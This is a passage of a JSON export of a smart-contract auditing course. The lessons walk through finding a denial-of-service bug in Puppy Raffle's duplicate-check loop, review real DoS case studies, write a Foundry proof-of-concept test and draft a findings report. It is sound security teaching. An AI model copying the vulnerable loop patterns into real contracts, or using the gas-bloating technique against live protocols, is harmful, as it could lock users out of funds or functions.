          "markdownContent": "---\ntitle: Recon - Reading Docs\n---\n\n_Follow along with this video:_\n\n---\n\n### Context from Documentation\n\nOk, we've scoped things out. Let's start with step 1 of `The Tincho` - Reading the documentation.\n\nWhat we've been provided is a little sparse - but read through the README of [**Puppy Raffle**](https://github.com/Cyfrin/4-puppy-raffle-audit).\n\n<details>\n<summary>About Puppy Raffle</summary>\n\n<p align=\"center\">\n<img src=\"/security-section-4/7-recon-reading-docs/reading-docs1.svg\" style=\"width: 75%; height: auto;\">\n<br/>\n\n# Puppy Raffle\n\nThis project is to enter a raffle to win a cute dog NFT. The protocol should do the following:\n\n1. Call the `enterRaffle` function with the following parameters:\n   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.\n2. Duplicate addresses are not allowed\n3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function\n4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy\n5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.\n\n</details>\n\n---\n\nAbove we see a pretty clear description of the protocol and it's intended functionality. What I like to do is open a `notes.md` file in my project and summarize things in my own words.\n\n```\n## About\n\n> The project allows users to enter a raffle to win a dog NFT.\n```\n\nUse this notes file to record your thoughts as you go, it'll make summarizing things for our report much easier later.\n\nLet's take a look at some of the code that powers the expected functionality in the next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "5efe7fcf-556b-464d-96be-e49c83a841a8",
          "number": 8,
          "title": "Recon: Reading the code",
          "slug": "recon-reading-the-code",
          "folderName": "8-recon-reading-the-code",
          "description": "",
          "duration": 5,
          "videoUrl": "LPwoILK9EA00IuxBDv1vNL02doAOebBkfzjEPSQ84eZTc",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/8-recon-reading-the-code/+page.md",
          "markdownContent": "---\ntitle: Recon - Reading the Code\n---\n\n_Follow along with this video:_\n\n---\n\n### Starting with the Code\n\nWhat I like to do when first assessing a codebase is to start at the `main entry point`. Sometimes this area of a protocol may be a little unclear, but using Solidity: Metrics can help us out a lot.\n\n<img src=\"../../../../static/security-section-4/7-recon-reading-docs/reading-docs2.png\" style=\"width: 75%; height: auto;\">\n\nPay special attention to the functions marked `public` or `external`. Especially those which `modify state` or are `payable`. These are going to be certain potential attack vectors.\n\n> **Note:** In Foundry you can use the command `forge inspect PuppyRaffle methods` to receive an output of methods for the contract.\n\nI would start with the `enterRaffle` function. Let's take a look.\n\n```js\n/// @notice this is how players enter the raffle\n/// @notice they have to pay the entrance fee * the number of players\n/// @notice duplicate entrants are not allowed\n/// @param newPlayers the list of players to enter the raffle\nfunction enterRaffle(address[] memory newPlayers) public payable {\n    require(msg.value == entranceFee * newPlayers.length, \"PuppyRaffle: Must send enough to enter raffle\");\n    for (uint256 i = 0; i < newPlayers.length; i++) {\n        players.push(newPlayers[i]);\n    }\n\n    // Check for duplicates\n    for (uint256 i = 0; i < players.length - 1; i++) {\n        for (uint256 j = i + 1; j < players.length; j++) {\n            require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n        }\n    }\n    emit RaffleEnter(newPlayers);\n}\n```\n\nStarting with the `NatSpec` we may have a few questions rise.\n\n- _What's meant by # of players?_\n- _How does the function prevent duplicant entrants?_\n\nWrite questions like these in your `notes.md` or even as `@audit` notes inline. These are things we'll want to answer as we progress through the code.\n\n###\n\nOne thing I notice in our next few lines is - I don't really love their naming conventions. `entranceFee` is immutable and nothing in this function makes that clear to me (unless I'm using [**Solidity Visual Developer**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor)).\n\nWere this a private audit, I may start an `Informational` section in my `notes.md`.\n\n```\n## About\n\n> The project allows users to enter a raffle to win a dog NFT.\n\n## Informational\n\n`PuppyRaffle::entranceFee` is immutable and should follow a more clear naming convention\n\n    ie. `i_entranceFee` or `ENTRANCE_FEE`\n```\n\n> **Pro-tip:** In VS Code you can use these keyboard shortcuts to navigate between previous and next cursor positions:\n>\n> - Windows: `Alt + Left/Right Arrow`\n> - Mac:\n>   - Previous - `Control + '-'`\n>   - Next - `Control + Shift + '-'`\n\n### Wrap Up\n\nWe're going to be bouncing between `Recon` and `Vulnerability` phases a bit in the Puppy Raffle review. Sometimes the lines can be a little blurry, but you'll find a workflow that works well for you with time and experience.\n\nLet's go back to the code.\n",
          "updates": []
        },
        {
          "lessonId": "4cbdd7b4-0509-4c40-9950-63db5206f49b",
          "number": 9,
          "title": "Recon: Reading docs II",
          "slug": "recon-reading-docs-continued",
          "folderName": "9-recon-reading-docs-continued",
          "description": "",
          "duration": 3,
          "videoUrl": "01Y7ckXfjR2ikuPmu1LTs401rW5cLQ6t7VegBDMW7KfoM",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/9-recon-reading-docs-continued/+page.md",
          "markdownContent": "---\ntitle: Recon - Reading Docs Continued\n---\n\n_Follow along with this video:_\n\n---\n\n### Back to `enterRaffle`\n\n```js\nfunction enterRaffle(address[] memory newPlayers) public payable {\n    require(msg.value == entranceFee * newPlayers.length, \"PuppyRaffle: Must send enough to enter raffle\");\n    for (uint256 i = 0; i < newPlayers.length; i++) {\n        players.push(newPlayers[i]);\n    }\n\n    // Check for duplicates\n    for (uint256 i = 0; i < players.length - 1; i++) {\n        for (uint256 j = i + 1; j < players.length; j++) {\n            require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n        }\n    }\n    emit RaffleEnter(newPlayers);\n}\n```\n\nBack to our `main entry point` function, we see it's using a require statement. Now, this contract is using `pragma 0.7.6`, so custom reverts may not have existed then - but this is a great example of a note we'd want to take and something we should check later.\n\n```js\nfunction enterRaffle(address[] memory newPlayers) public payable {\n    require(msg.value == entranceFee * newPlayers.length, \"PuppyRaffle: Must send enough to enter raffle\"); //@audit - Are custom reverts an option in 0.7.6?\n    ...\n}\n```\n\nA few additional details we notice as we traverse the function:\n\n- Our require statement compares to `newPlayers.length` - _what happens if this is 0?_\n- The `entranceFee` is an `immutable variable` - we can confirm this is initialized in the constructor.\n- The raffle is keeping track of who has entered the raffle by pushing each index of `newPlayers[]` to `players[]`.\n\nThe last section of this function is finally our check for duplicates.\n\n```js\n// Check for duplicates\nfor (uint256 i = 0; i < players.length - 1; i++) {\n    for (uint256 j = i + 1; j < players.length; j++) {\n        require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n    }\n}\n```\n\nWith experience you'll be able to _smell_ bugs. You'll see messy blocks of code like the above and your intuition is going to kick in.\n\nCan you spot the bugðŸ›?\n\n### Wrap Up\n\nWe've learnt SO MUCH from this single entry point of this contract. I hope you've been taking notes of what we uncover as we go. These protocol's we're going through may be small in scope - but they won't always be. Building strong organizational habits now will benefit you later on.\n\nNext, let's take a look at a repo in which we've compiled simplified examples of common exploits, maybe we'll find the bug mentioned above!\n",
          "updates": []
        },
        {
          "lessonId": "c05360dd-ce70-4852-ac01-d7f15c9d2f44",
          "number": 10,
          "title": "sc-exploits-minimized",
          "slug": "sc-exploits-minimized",
          "folderName": "10-sc-exploits-minimized",
          "description": "",
          "duration": 2,
          "videoUrl": "OSMLqn1AAWsIApMjLLTWOingE2AIOAWjZQfcuest6w8",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/10-sc-exploits-minimized/+page.md",
          "markdownContent": "---\ntitle: sc-exploits-minimized\n---\n\n_Follow along with this video:_\n\n---\n\n### Exploits, but smaller\n\n```js\n// Check for duplicates\nfor (uint256 i = 0; i < players.length - 1; i++) {\n    for (uint256 j = i + 1; j < players.length; j++) {\n        require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n    }\n}\n```\n\nThis code above is going to cause something called a Denial of Service or DOS.\n\nIn order to get a better understanding of this bug, let's look at a _minimized_ example of it. If you reference the [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo, half way down you should see something like what's pictured below.\n\n<img src=\"/security-section-4/10-sc-exploits-minimized/sc-exploits-minimized1.png\" style=\"width: 75%; height: auto;\">\n\nThis is an amazing resource to test your skills in general and familiarize yourself with common exploits. Addionally the `src` folder of `sc-exploits-minimized` contains minimalistic examples of a variety of vulnerabilities as well.\n\nFor now, let's check out the [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/denial-of-service/DoS.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) of the Denial of Service exploit in the next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "22735d90-b37e-49c8-9c29-5267ddbf07fa",
          "number": 11,
          "title": "Exploit: Denial of service",
          "slug": "exploit-denial-of-service",
          "folderName": "11-exploit-denial-of-service",
          "description": "",
          "duration": 7,
          "videoUrl": "mM00102cLTV005LZgeRkPvCb00ztJPl2FnMv00nAG7XcoshM",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/11-exploit-denial-of-service/+page.md",
          "markdownContent": "---\ntitle: Exploit - Denial of Service (DoS)\n---\n\n_Follow along with this video:_\n\n---\n\n### Denial of Service\n\nLet's dive right in and take a look at the DoS contract brought up in our [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/denial-of-service/DoS.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) example.\n\n<details open>\n<summary>DoS Contract</summary>\n\n```js\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\ncontract DoS {\n    address[] entrants;\n\n    function enter() public {\n        // Check for duplicate entrants\n        for (uint256 i; i < entrants.length; i++) {\n            if (entrants[i] == msg.sender) {\n                revert(\"You've already entered!\");\n            }\n        }\n        entrants.push(msg.sender);\n    }\n}\n```\n\n</details>\n\nWe can see right away that this `enter` function is doing something very similar to what we saw in `PuppyRaffle::enterRaffle`. Every time someone calls this function, it checks for a duplicate in the `entrants` array, and if one isn't found `msg.sender` is added to `entrants`.\n\nThe problem arises when the size of our `entrants` array grows. Every time someone is added to the `entrants` array, another loop is added to the duplicate check and as a result `more gas is consumed`.\n\n### Remix Example\n\nWe can see this in action by deploying our contract on Remix and comparing the gas consumed when we call this function subsequent times (remember, you'll need to switch your address being used).\n\nHere's what it looks like for the first four people calling the `enter` function.\n\n<img src=\"/security-section-4/11-exploit-denial-of-service/exploit-denial-of-service1.png\" style=\"width: 75%; height: auto;\">\n\nThis kind of behavior raises questions about fairness and ultimately is going to lead to a `denial of service` in that it will become impractical for anyone to interact with this function, because gas costs will be too high.\n\n### Exploring DoS attack in Foundry\n\nConveniently, if you clone the [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo. I've included a test suite to illustrate these attack vectors as well.\n\n```bash\ngit clone https://github.com/Cyfrin/sc-exploits-minimized\ncd sc-exploits-minimized\nmake\n```\n\nThe above series of commands will clone the repo and build it locally.\n\nOnce this is done, I want to draw you attention to `/test/unit/DoSTest.t.sol`\n\nTo summarize, this test deploys the same `DoS` contract we've been looking at:\n\n```js\nfunction setUp() public {\n        dos = new DoS();\n    }\n```\n\nCalls the `enter` function and records the gas costs of those calls:\n\n```js\nvm.prank(warmUpAddress);\n    dos.enter();\n\n    uint256 gasStartA = gasleft();\n    vm.prank(personA);\n    dos.enter();\n    uint256 gasCostA = gasStartA - gasleft();\n\n    uint256 gasStartB = gasleft();\n    vm.prank(personB);\n    dos.enter();\n    uint256 gasCostB = gasStartB - gasleft();\n\n    uint256 gasStartC = gasleft();\n    vm.prank(personC);\n    dos.enter();\n    uint256 gasCostC = gasStartC - gasleft();\n```\n\nAnd finally prints the gas costs and asserts that each call is more expensive than the last:\n\n```js\nconsole2.log(\"Gas cost A: %s\", gasCostA);\nconsole2.log(\"Gas cost B: %s\", gasCostB);\nconsole2.log(\"Gas cost C: %s\", gasCostC);\n\nassert(gasCostC > gasCostB);\nassert(gasCostB > gasCostA);\n```\n\nIf we run this test with `forge test --mt test_denialOfService -vvv` we see that the test indeed passes and we get a print out corroborating the vulnerability!\n\n<img src=\"/security-section-4/11-exploit-denial-of-service/exploit-denial-of-service2.png\" style=\"width: 75%; height: auto;\">\n\nI challenge you to play with this test a little bit and customize it. See if you can adjust it to print out the gas costs with 1000 entrants!\n\n### Wrap Up\n\nAs can be seen, DoS attacks can be very impactful for a protocol. They can inject unfairness and cause interactions to be prohibitively expensive.\n\nIn our next lesson we'll be looking at a case study of one such attack.\n",
          "updates": []
        },
        {
          "lessonId": "f92b18c6-4e62-46f7-82d8-5b3c43e6e24d",
          "number": 12,
          "title": "Case Study: DoS",
          "slug": "dos-case-study",
          "folderName": "12-dos-case-study",
          "description": "",
          "duration": 21,
          "videoUrl": "lsOACFdb015xAPbt5ecssfxFS2aMG0102ljJW3q8sjAUJE",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/12-dos-case-study/+page.md",
          "markdownContent": "---\ntitle: DoS - Case Study\n---\n\n_Follow along with this video:_\n\n---\n\n### Live DoS Examples\n\nIn this lesson, we delve into two different kinds of **Denial of Service Attacks** or **DoS attacks** as they were uncovered from real security reviews. Owen, the founder of Guardian Audits, will share insights from his work, showing us how these vulnerabilities arise and the best frameworks to uncover them.\n\n### Introduction to Owen\n\nThe case studies we'll be covering today are brought to us by Owen - the Founder of Guardian Audits. Guardian Audits was founded 2 years ago and has since made Web3 more secure by uncovering hundreds of vulnerabilities.\n\nIn this lesson, Owen provides a breakdown of audits in which DoS vulnerabilities were uncovered and we're greatly appreciative to Owen for his contributions. ðŸ™\n\n## Case Study 1: Bridges Exchange\n\nThe first DoS vulnerability we'll touch on was found in the dividends distribution system of the Bridges exchange.\n\n### Attack Mechanics\n\nThe issue arises from an `unbounded for-loop` in the `distributeDividends` function, resulting in the risk of a DoS attack. An ill-intentioned party can cause the distribute dividends function to violate the block gas limit, effectively blocking all dividends by continually generating new addresses and minting minimal quantities of the Bridges pair token.\n\nLet's look at the code.\n\n```js\nfunction distributeDividends(uint amount) public payable lock {\n   require(amount == msg.value, \"don't cheat\");\n   uint length = users.length;\n   amount = amount.mul(magnitude);\n   for (uint i; i < length; i++){\n      if(users[i] != address(0)){\n         UserInfo storage user = userInfo[users[i]];\n         user.rewards += (amount.mul(IERC20(address(thiss).balanceOf(users[i])).div(totalSupply.sub(MINIMUM_LIQUIDITY))));\n      }\n   }\n}\n```\n\nWe can see the `unbounded for-loop` above. This is looping through an array, `users[]`, the length of which has no limits.\n\nThe practical effect of this is that, were the length of the `users[]` array long enough, the gas required to call this function would be prohibitively expensive. Potentially hitting block caps and being entirely uncallable.\n\n### Confirming the Attack Vector\n\nIn order to verify this is a vulnerability. We should invesitgate under what circumstances the `user[]` array can be added to.\n\nBy searching for the variable we see the array is appended to in the mint function:\n\n```js\nfunction mint(address to) external lock returns (uint liquidity){\n   ...\n   if(IERC20(address(this).balanceOf(to) == 0)){\n      users.push(to);\n   }\n}\n```\n\nIn theory, an attacker could generate new wallet addresses (or transfer the minted tokens) to call this function repeatedly, bloating the array and DOSing the function.\n\nThe resolution for the Bridges Exchange was to refactor things such that the `for-loop` wasn't needed.\n\n## Case Study 2: Dos Attack in GMX V2\n\nThe second instance of a DoS attack shows up in the GMX V2 system and is entirely different than the Bridges Exchange case mentioned above.\n\n### Attack Mechanics\n\nThe problem arises from a boolean indicator called `shouldUnwrapNativeToken`. This flag can be leveraged to set up positions that can't be reduced by liquidations or ADL (Auto-Deleveraging) orders. When the native token unwraps (with the flag set to true), a position can be formed by a contract that can't receive the native token. This leads to order execution reverting, causing a crucial function of the protocol to become unexecutable.\n\n### Into the Code\n\nLet's investigate what this looks like in code.\n\nWithin the GMX V2 `DecreaseOrderUtils` library we have the `processOrder` function. While processing an order with this library we eventually will call `transferNativeToken` within `TokenUtils.sol`.\n\n```js\nfunction transferNativeToken(DataStore dataStore, address receiver, uint256 amount) internal {\n   if (amount == 0) {return;}\n\n   uint256 gasLimit = dataStore.getUint(keys.NATIVE_TOKEN_TRANSFER_GAS_LIMIT);\n\n   (bool success, bytes memory data) = payable(receiver).call{value: amount, gas: gasLimit} (\"\");\n\n   if (success){return;}\n\n   string memory reason = string(abi.encode(data));\n   emit NativeTokenTransferReverted(reason);\n\n   revert NativeTokenTransferError(receiver, amount);\n}\n\n```\n\nUltimately, this is where the problem lies. When a position in the protocol is liquidated, or de-leveraged, and the `shouldUnwrapNativeToken` flag is true, this function is called in the process.\n\nWere the `receiver` address a contract which was unable to receive value - the liquidation of the user would revert every time.\n\nThis is a critical flaw!\n\nYou may notice another potential vulnerability in the same function - the `gasLimit`. Were the receiver a contract address which expended unnecessary gas in it's receive function - this call would also revert!\n\n### Wrap Up\n\nTo summarize, here are a couple things to keep an eye out for which may lead to DoS attacks:\n\n1. **For-Loops**: Take extra caution with for-loops. Ask yourself these questions:\n   - Is the iterable entity bounded by size?\n   - Can a user append arbitrary items to the list?\n   - How much does it cost the user to do so?\n2. **External calls**: These can be anything from transfering Eth to calling a third-party contract. Evaluate ways these external calls could fail, leading to an incomplete transaction.\n\nDoS attacks put simply are - the denial of functions of a protocol. They can arise from multiple sources, but the end result is always a transaction failing to execute.\n\nBe vigilant for the above situations in your security reviews. Let's next look at what a PoC for Denial of Service is like.\n",
          "updates": []
        },
        {
          "lessonId": "89c740dd-2506-4ce9-87a8-41f58e0a1076",
          "number": 13,
          "title": "DoS PoC",
          "slug": "dos-poc",
          "folderName": "13-dos-poc",
          "description": "",
          "duration": 8,
          "videoUrl": "mZ00aPnzz01LUw01Ao1lRc7HOu3WVCQUanHv00n6MzXUGgw",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/13-dos-poc/+page.md",
          "markdownContent": "---\ntitle: DoS - PoC (Proof of Code)\n---\n\n_Follow along with this video:_\n\n---\n\n### Back to Puppy Raffle\n\nNow that we possess a little more context and understanding of what a `Denial of Service` attack is, and what it can mean for a protocol, let's return to Puppy Raffle and remind ourselves where we began.\n\n```js\n/// @notice this is how players enter the raffle\n/// @notice they have to pay the entrance fee * the number of players\n/// @notice duplicate entrants are not allowed\n/// @param newPlayers the list of players to enter the raffle\nfunction enterRaffle(address[] memory newPlayers) public payable {\n    require(msg.value == entranceFee * newPlayers.length, \"PuppyRaffle: Must send enough to enter raffle\");\n    for (uint256 i = 0; i < newPlayers.length; i++) {\n        players.push(newPlayers[i]);\n    }\n\n    // Check for duplicates\n    for (uint256 i = 0; i < players.length - 1; i++) {\n        for (uint256 j = i + 1; j < players.length; j++) {\n            require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n        }\n    }\n    emit RaffleEnter(newPlayers);\n}\n```\n\nThis should look very familiar to us by now:\n\n```js\n// Check for duplicates\n// @audit Possible DoS\nfor (uint256 i = 0; i < players.length - 1; i++) {\n    for (uint256 j = i + 1; j < players.length; j++) {\n        require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n    }\n}\n```\n\nAt this point I would add this to my `notes.md`, you may want to come back to this later and continue assessing the code back, but let's go ahead and prove this finding now.\n\n### Proof of Code\n\nIf the protocol has an existing test suite, it's often easier to add our tests to it then write things from scratch.\n\nRun `forge test` to make sure the test suite is working correctly so far!\n\nThere are lots of useful parts of `PuppyRaffle.t.sol` we can use for our PoC.\n\nNow, here's your challenge. I want you to try and write the `Proof of Code` yourself. Build those skills by trying to write a test function that shows the potential `Denial of Service` we've uncovered.\n\n<details>\n<summary> The Proof of Code </summary>\n\nGreat! Now that you've _100%_ tried this yourself, let's go through it together.\n\nI would start by harvesting the existing `testCanEnterRaffle` function. This is a great boilerplate for what we're trying to show.\n\n```js\nfunction testCanEnterRaffle() public {\n    address[] memory players = new address[](1);\n    players[0] = playerOne;\n    puppyRaffle.enterRaffle{value: entranceFee}(players);\n    assertEq(puppyRaffle.players(0), playerOne);\n}\n```\n\nLet's repurpose this!\n\n```js\nfunction testDenialOfService() public {\n    // Foundry lets us set a gas price\n    vm.txGasPrice(1);\n\n    // Creates 100 addresses\n    uint256 playersNum = 100;\n    address[] memory players = new address[](playersNum);\n    for(uint i = 0; i < players.length; i++){\n        players[i] = address(i);\n    }\n\n    // Gas calculations for first 100 players\n    uint256 gasStart = gasleft();\n    puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);\n    uint256 gasEnd = gasleft();\n    uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;\n    console.log(\"Gas cost of the first 100 players: \", gasUsedFirst);\n}\n```\n\nRunning the command `forge test --mt testDenialOfService -vvv` should give us an output like this:\n\n<img src=\"/security-section-4/13-dos-poc/dos-poc1.png\" style=\"width: 75%; height: auto;\">\n\nNow let's do the same thing for the second 100 players! We'll need to add something like this to our test.\n\n```js\n// Creats another array of 100 players\naddress[] memory playersTwo = new address[](playersNum);\nfor (uint256 i = 0; i < playersTwo.length; i++) {\n    playersTwo[i] = address(i + playersNum);\n}\n\n// Gas calculations for second 100 players\nuint256 gasStartTwo = gasleft();\npuppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);\nuint256 gasEndTwo = gasleft();\nuint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;\nconsole.log(\"Gas cost of the second 100 players: \", gasUsedSecond);\n\nassert(gasUsedFirst < gasUsedSecond);\n```\n\nIf we rerun our test we can see.. Our test passes! The second 100 players are paying _a LOT_ more and are at a significant disadvantage!\n\n<img src=\"/security-section-4/13-dos-poc/dos-poc2.png\" style=\"width: 75%; height: auto;\">\n\n</details>\n\n---\n\n### Wrap Up\n\nThat's all there is to it. We've clearly shown a potential `Denial of Service` through our `Proof of Code`. This test function is going to go right into our report.\n\nLet's do that now!\n",
          "updates": []
        },
        {
          "lessonId": "3eda855d-5826-4449-aeea-cd481090ba34",
          "number": 14,
          "title": "DoS: Reporting",
          "slug": "dos-reporting",
          "folderName": "14-dos-reporting",
          "description": "",
          "duration": 8,
          "videoUrl": "XL5qC8ErrYyD16uRBXQSVbJl9EVAXB301jLbmdnkpLQY",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/14-dos-reporting/+page.md",
          "markdownContent": "---\ntitle: DoS - Reporting\n---\n\n_Follow along with this video:_\n\n---\n\n### Denial of Service PoC\n\nMaybe you're the type of security reviewer who likes to save all the write ups to the end. There's nothing wrong with that! As you grow and gain experience you'll begin to carve out your own workflow and ways of doing things.\n\nIn future lessons, we may not go through writing things up together, but for now - let's report this uncovered DoS vulnverability\n\nWe of course start with our template, create a `findings.md` file and paste this within:\n\n---\n\n### [S-#] TITLE (Root Cause + Impact)\n\n**Description:**\n\n**Impact:**\n\n**Proof of Concept:**\n\n**Recommended Mitigation:**\n\n---\n\n### Title\n\nRemember the rule of thumb!\n\n`<ROOT CAUSE> + Impact`.\n\nSo, what's our root cause? Looping through an array to check for duplicates is the cause. What about the impact? Well, this causes a denial of service due to incrementing gas costs!\n\nSo the title I'm going with is something like this:\n\n```\n### [S-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants\n```\n\nWhat can I say, I like to be verbose, but at least I'm clear!\n\nRegarding severity, let's consider the impact vs likelihood of this scenario.\n\nImpact - The protocol is unlikely to fully break, it simply makes the raffle more expensive to participate in. I might rate this a `Medium`.\n\nLikelihood - If an attacker wants the NFT badly enough, this will surely happen - but it does cost the attacker a lot. I might settle with `Medium` here as well.\n\nWith an Impact of `Medium` and a likelihood of `Medium`, this finding's severity is going to be decidedly `Medium`.\n\nUpdate our title appropriately `[M-#]`.\n\n### When to do Writeups\n\nOften, I won't do a whole writeup as soon as I think I've found something. The reason for this is simple - I might be wrong! It's entirely possible that I come across more information as I dive deeper into the protocol that makes clear that what I thought was an issue actually isn't.\n\nSometimes I'll just leave my in-line notes indicating my suspicions and come back to them at the end.\n\nFor now, let's write the report as though we're confident this is valid.\n\n### Description\n\nFeel free to write your own description! Remember we want to be clear in how we illustrate the vulnerability and its affects.\n\nHere's mine.\n\n```\n**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.\n\n'''javascript\n// @audit Dos Attack\n@> for(uint256 i = 0; i < players.length -1; i++){\n    for(uint256 j = i+1; j< players.length; j++){\n    require(players[i] != players[j],\"PuppyRaffle: Duplicate Player\");\n  }\n}\n'''\n```\n\n### Impact\n\nThis is pretty clear from our description, but we can expand on things a little more.\n\n```\n**Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.\n\nAn attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.\n```\n\n### Proof of Concept/Code\n\nWe did the hard part of this in our previous lesson, but let's add it to our report.\n\n```\n**Proof of Concept:**\n\nIf we have 2 sets of 100 players enter, the gas costs will be as such:\n- 1st 100 players: ~6252048 gas\n- 2nd 100 players: ~18068138 gas\n\nThis is more than 3x more expensivee for the second 100 players.\n\n<details>\n<summary>Proof of Code</summary>\n\n'''js\nfunction testDenialOfService() public {\n      // Foundry lets us set a gas price\n      vm.txGasPrice(1);\n\n      // Creates 100 addresses\n      uint256 playersNum = 100;\n      address[] memory players = new address[](playersNum);\n      for (uint256 i = 0; i < players.length; i++) {\n          players[i] = address(i);\n      }\n\n      // Gas calculations for first 100 players\n      uint256 gasStart = gasleft();\n      puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);\n      uint256 gasEnd = gasleft();\n      uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;\n      console.log(\"Gas cost of the first 100 players: \", gasUsedFirst);\n\n      // Creats another array of 100 players\n      address[] memory playersTwo = new address[](playersNum);\n      for (uint256 i = 0; i < playersTwo.length; i++) {\n          playersTwo[i] = address(i + playersNum);\n      }\n\n      // Gas calculations for second 100 players\n      uint256 gasStartTwo = gasleft();\n      puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);\n      uint256 gasEndTwo = gasleft();\n      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;\n      console.log(\"Gas cost of the second 100 players: \", gasUsedSecond);\n\n      assert(gasUsedSecond > gasUsedFirst);\n  }\n'''\n\n</details>\n```\n\n### Wrap Up\n\nClick below to see what our finding report should look like so far!\n\n<details>\n<Summary>DoS Writeup</summary>\n\n### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants\n\n**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.\n\n```javascript\n// @audit Dos Attack\n@> for(uint256 i = 0; i < players.length -1; i++){\n    for(uint256 j = i+1; j< players.length; j++){\n    require(players[i] != players[j],\"PuppyRaffle: Duplicate Player\");\n  }\n}\n```\n\n**Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.\n\nAn attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.\n\n**Proof of Concept:**\n\nIf we have 2 sets of 100 players enter, the gas costs will be as such:\n\n- 1st 100 players: ~6252048 gas\n- 2nd 100 players: ~18068138 gas\n\nThis is more than 3x more expensivee for the second 100 players.\n\n<details>\n<summary>Proof of Code</summary>\n\n```js\nfunction testDenialOfService() public {\n      // Foundry lets us set a gas price\n      vm.txGasPrice(1);\n\n      // Creates 100 addresses\n      uint256 playersNum = 100;\n      address[] memory players = new address[](playersNum);\n      for (uint256 i = 0; i < players.length; i++) {\n          players[i] = address(i);\n      }\n\n      // Gas calculations for first 100 players\n      uint256 gasStart = gasleft();\n      puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);\n      uint256 gasEnd = gasleft();\n      uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;\n      console.log(\"Gas cost of the first 100 players: \", gasUsedFirst);\n\n      // Creats another array of 100 players\n      address[] memory playersTwo = new address[](playersNum);\n      for (uint256 i = 0; i < playersTwo.length; i++) {\n          playersTwo[i] = address(i + playersNum);\n      }\n\n      // Gas calculations for second 100 players\n      uint256 gasStartTwo = gasleft();\n      puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);\n      uint256 gasEndTwo = gasleft();\n      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;\n      console.log(\"Gas cost of the second 100 players: \", gasUsedSecond);\n\n      assert(gasUsedSecond > gasUsedFirst);\n  }\n```\n\n</details>\n<br>\n\n**Recommended Mitigations:**\n\n</details>\n\n---\n\nThings look great! Lets finally have a look at what mitigations we can recommend for this vulnerability, in the next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "48c3d22f-6318-47cb-8781-f8d732186cd4",
          "number": 15,
          "title": "DoS: Mitigation",
          "slug": "dos-mitigation",
          "folderName": "15-dos-mitigation",
          "description": "",
          "duration": 3,
          "videoUrl": "nX4J02l7F7OyMhMKc021g2XMWiVTlCJIe6EQlnntumps8",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/15-dos-mitigation/+page.md",
